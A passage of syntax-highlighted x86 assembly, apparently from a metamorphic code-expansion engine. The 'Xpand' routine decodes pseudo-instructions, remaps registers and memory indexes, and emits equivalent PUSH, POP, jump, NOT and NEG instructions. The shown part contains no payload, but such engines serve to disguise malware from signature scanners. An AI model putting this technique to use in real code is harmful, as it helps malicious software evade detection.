                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">; Extend the sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@OPMemImmSet</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@OPMemImmSet</span><span class="sc0">          </span><span class="sc1">; Set the value</span><span class="sc0">
     </span><span class="sc5">@@OPMemImm32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get the normal value if 32 bits</span><span class="sc0">
     </span><span class="sc5">@@OPMemImmSet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the immediate</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0">  </span><span class="sc1">; Copy the mem. address ref.</span><span class="sc0">
                                             </span><span class="sc1">; (translating the indexes also)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">       </span><span class="sc1">; Generate an OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">
     </span><span class="sc5">@@OPRegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Extend the sign for 8 bits</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; operations</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OPRegImm32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@OPRegImmSet</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@OPRegImmSet</span><span class="sc0">
       </span><span class="sc5">@@OPRegImm32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">@@OPRegImmSet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the immediate</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">  </span><span class="sc1">; Translate it to the new one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">           </span><span class="sc1">; Generate an OP Reg,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">
     </span><span class="sc5">@@OPRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get the source register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">  </span><span class="sc1">; Translate it and set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get the destiny register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">  </span><span class="sc1">; Translate it and set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">           </span><span class="sc1">; Generate an OP Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">
     </span><span class="sc5">@@OPRegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0">   </span><span class="sc1">; Copy the memory address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; (with indexes translation)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">  </span><span class="sc1">; Translate the destiny reg.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">           </span><span class="sc1">; Generate an OP Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">
     </span><span class="sc5">@@OPMemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0">   </span><span class="sc1">; Copy the memory address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; (with indexes translation)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">  </span><span class="sc1">; Translate the source reg.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">           </span><span class="sc1">; Generate an OP Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">; Get if it's a 8 bits generic</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Xpand_Next002</span><span class="sc0">       </span><span class="sc1">; operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Xpand_Next002</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">            </span><span class="sc1">; If it is, set "8 bits usage"</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Generic</span><span class="sc0">             </span><span class="sc1">; (value 80h in [Xp_8Bits]) and</span><span class="sc0">
                                            </span><span class="sc1">; jump to make the operation</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next002</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">                </span><span class="sc1">; PUSH Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next003</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Then, translate the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">; and set it in the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0"> </span><span class="sc1">; corresponding field</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">           </span><span class="sc1">; Generate a PUSH Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next003</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">               </span><span class="sc1">; PUSH Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next004</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Then, set the memory address</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; (with index translation),</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; clear the "8 bits" flag and</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">          </span><span class="sc1">; generate the PUSH Mem.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next004</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">                </span><span class="sc1">; POP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next005</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Translate the register, set</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">; it into the working field</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0"> </span><span class="sc1">; and generate a POP Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next005</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">               </span><span class="sc1">; POP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next006</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Then, copy the memory address</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; with index translation, clear</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; the "8 bits" flag and call</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">           </span><span class="sc1">; the function to generate a</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">                    </span><span class="sc1">; POP Mem.</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next006</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">               </span><span class="sc1">; PUSH Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next007</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Set the immediate </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHImm</span><span class="sc0">          </span><span class="sc1">; Generate a PUSH Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next007</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">               </span><span class="sc1">; Jcc?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Xpand_Next008</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Xpand_Next008</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the type of conditional</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; jump in the operation field</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; and the label in the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJcc</span><span class="sc0">               </span><span class="sc1">; Imm field, and generate it.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next008</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">              </span><span class="sc1">; NOT Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next009</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetRegister</span><span class="sc0">      </span><span class="sc1">; Then, translate and set the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">           </span><span class="sc1">; 32 bits register and generate</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">                    </span><span class="sc1">; a NOT Reg</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next009</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc0">              </span><span class="sc1">; NOT Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next010</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Then, copy and translate the</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; memory address and indexes,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; set "32 bits usage" and</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">           </span><span class="sc1">; generate a NOT Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next010</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">              </span><span class="sc1">; NOT Reg8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next011</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_Set8BitsRegister</span><span class="sc0"> </span><span class="sc1">; Then, translate and set the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">           </span><span class="sc1">; 8 bits register and generate</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">                    </span><span class="sc1">; a NOT Reg8</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next011</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">              </span><span class="sc1">; The same as with E1 (NOT Mem)</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next012</span><span class="sc0">          </span><span class="sc1">; but with 8 bits operands.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next012</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc0">              </span><span class="sc1">; NEG Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next013</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetRegister</span><span class="sc0">      </span><span class="sc1">; Then, translate the register,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGReg</span><span class="sc0">           </span><span class="sc1">; set it and generate the op.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next013</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc0">              </span><span class="sc1">; NEG Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next014</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Copy the address, translate</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; the indexes, set "32 bits"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; flag and generate the instrc.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next014</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc0">              </span><span class="sc1">; NEG Reg8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next015</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_Set8BitsRegister</span><span class="sc0"> </span><span class="sc1">; Then do the same as with</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGReg</span><span class="sc0">           </span><span class="sc1">; E4 (NEG Reg) but with 8 bits</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Ret</span><span class="sc0">                    </span><span class="sc1">; operands</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next015</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0">              </span><span class="sc1">; NEG Mem8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Xpand_Next016</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Then do the same as with E5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">               </span><span class="sc1">; (NEG Mem) but with a 8 bits</span><span class="sc0">
